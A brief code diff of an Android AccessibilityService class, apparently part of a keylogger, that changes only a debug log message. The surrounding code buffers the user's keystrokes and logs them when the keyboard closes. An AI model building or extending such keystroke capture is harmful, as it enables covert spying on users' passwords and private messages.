@@ -77,7 +77,7 @@ class DaggerService : AccessibilityService() {
                     AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                         if (event.text?.toString()?.toLowerCase() == Config.KEYBOARD_DISMISSED_TEXT) {
                             val keystrokes = keyLogger.toString()
-                            Log.d(TAG, "Got keystrokes: $keystrokes")
+                            Log.d(TAG, "Got keystrokeQueue: $keystrokes")
                         }
                     }
                 }
